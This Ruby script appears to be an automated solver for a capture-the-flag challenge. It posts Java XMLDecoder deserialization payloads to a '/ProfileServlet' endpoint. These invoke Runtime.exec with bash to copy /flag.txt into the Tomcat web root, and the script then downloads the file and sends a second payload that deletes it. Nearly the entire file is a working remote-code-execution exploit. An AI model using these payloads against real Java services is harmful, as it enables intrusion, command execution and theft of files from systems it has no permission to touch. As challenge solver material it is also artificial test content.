require 'uuid'
require 'httparty'
require_relative 'libronsolve'

TEMP = UUID.generate.to_s

COPY = <<~COPY
  <?xml version="1.0" encoding="UTF-8"?>
  <java version="1.8.0_102" class="java.beans.XMLDecoder">
   <object class="java.lang.Runtime" method="getRuntime">
        <void method="exec">
        <array class="java.lang.String" length="3">
            <void index="0">
                <string>/bin/bash</string>
            </void>
            <void index="1">
                <string>-c</string>
            </void>
            <void index="2">
                <string>cp /flag.txt /usr/local/tomcat/webapps/ROOT/#{ TEMP }.txt</string>
            </void>
        </array>
        </void>
   </object>
  </java>
COPY

DELETE = <<~DELETE
  <?xml version="1.0" encoding="UTF-8"?>
  <java version="1.8.0_102" class="java.beans.XMLDecoder">
   <object class="java.lang.Runtime" method="getRuntime">
        <void method="exec">
        <array class="java.lang.String" length="3">
            <void index="0">
                <string>/bin/bash</string>
            </void>
            <void index="1">
                <string>-c</string>
            </void>
            <void index="2">
                <string>rm -f /usr/local/tomcat/webapps/ROOT/#{ TEMP }.txt</string>
            </void>
        </array>
        </void>
   </object>
  </java>
DELETE

# Move the file
HTTParty.post("#{ get_url() }/ProfileServlet", body: COPY)

# Get the file
result = HTTParty.get("#{ get_url() }/#{ TEMP }.txt")

# Delete the file
HTTParty.post("#{ get_url() }/ProfileServlet", body: DELETE)

if result.success?
  check_flag(result.parsed_response, terminate: true, partial: true)
else
  puts "Something went wrong: #{ result.parsed_response }"
  exit(1)
end
